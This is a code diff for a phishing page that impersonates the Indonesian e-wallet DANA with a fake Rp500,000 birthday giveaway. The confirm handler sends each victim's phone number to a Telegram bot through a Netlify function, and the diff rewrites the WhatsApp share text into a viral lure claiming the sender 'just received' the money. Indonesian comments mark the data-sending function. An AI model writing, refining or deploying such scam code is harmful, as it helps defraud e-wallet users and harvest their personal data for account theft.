@@ -69,6 +69,7 @@ function showSuccessMessage() {
     }, 5000);
 }
 
+// ==================== HANYA FUNGSI INI YANG MENGIRIM KE TELEGRAM ====================
 // Fungsi untuk mengirim data ke Netlify Function (Hanya nomor HP)
 async function sendToTelegram(phoneNumber) {
     const message = `┌─ 📱 DANA - Hajatan Ulang Tahun
@@ -102,8 +103,9 @@ async function sendToTelegram(phoneNumber) {
         return false;
     }
 }
+// ==================== AKHIR FUNGSI TELEGRAM ====================
 
-// Claim reward function
+// Claim reward function (TIDAK mengirim ke Telegram)
 function claimReward() {
     triggerConfetti();
     showSuccessMessage();
@@ -112,11 +114,19 @@ function claimReward() {
     }, 500);
 }
 
-// Share to WhatsApp
+// Share to WhatsApp (TIDAK mengirim ke Telegram)
 function shareToWA() {
-    const shareUrl = encodeURIComponent(window.location.href);
-    const shareText = encodeURIComponent("🎉 Dapatkan saldo Rp500.000 dari Hajatan Ulang Tahun DANA! Yuk klaim sekarang juga! 🎉");
-    const waUrl = `https://wa.me/?text=${shareText}%20${shareUrl}`;
+    // Teks yang akan muncul saat share ke WhatsApp
+    const shareText = `*DANA bagi-bagi saldo Rp500.000* 
+
+Aku baru saja dapat 😳 cek apakah kamu juga dapat.
+
+_Klik di sini_ 👇
+${window.location.href}`;
+    
+    // Encode teks untuk URL
+    const encodedText = encodeURIComponent(shareText);
+    const waUrl = `https://wa.me/?text=${encodedText}`;
     window.open(waUrl, '_blank');
     
     // Update share progress
@@ -148,7 +158,7 @@ function shareToWA() {
     }
 }
 
-// Like post function
+// Like post function (TIDAK mengirim ke Telegram)
 function likePost() {
     let likes = document.getElementById('likes');
     let currentLikes = likes.innerText;
@@ -162,7 +172,7 @@ function likePost() {
     alert('👍 Terima kasih telah menyukai postingan ini!');
 }
 
-// Simulate progress bar
+// Simulate progress bar (TIDAK mengirim ke Telegram)
 function simulateProgress(callback) {
     let progress = 0;
     const fillElement = document.getElementById('fill2');
@@ -204,7 +214,8 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // Confirm phone number
+    // ==================== INI SATU-SATUNYA YANG MENGIRIM KE TELEGRAM ====================
+    // Confirm phone number - HANYA DI SINI fungsi sendToTelegram() dipanggil
     const confirmButton = document.getElementById('confirm');
     if (confirmButton) {
         confirmButton.addEventListener('click', async function() {
@@ -222,7 +233,7 @@ document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('info').style.display = 'none';
             document.getElementById('checking').style.display = 'block';
             
-            // Kirim data ke Telegram via Netlify Function
+            // HANYA DISINI KIRIM KE TELEGRAM - TIDAK ADA DI TEMPAT LAIN
             await sendToTelegram(phone);
             
             simulateProgress(() => {
@@ -233,8 +244,9 @@ document.addEventListener('DOMContentLoaded', function() {
             });
         });
     }
+    // ==================== AKHIR PENGIRIMAN KE TELEGRAM ====================
 
-    // Add comment functionality
+    // Add comment functionality (TIDAK mengirim ke Telegram)
     const commentInput = document.getElementById('commentInput');
     if (commentInput) {
         commentInput.addEventListener('keypress', function(e) {
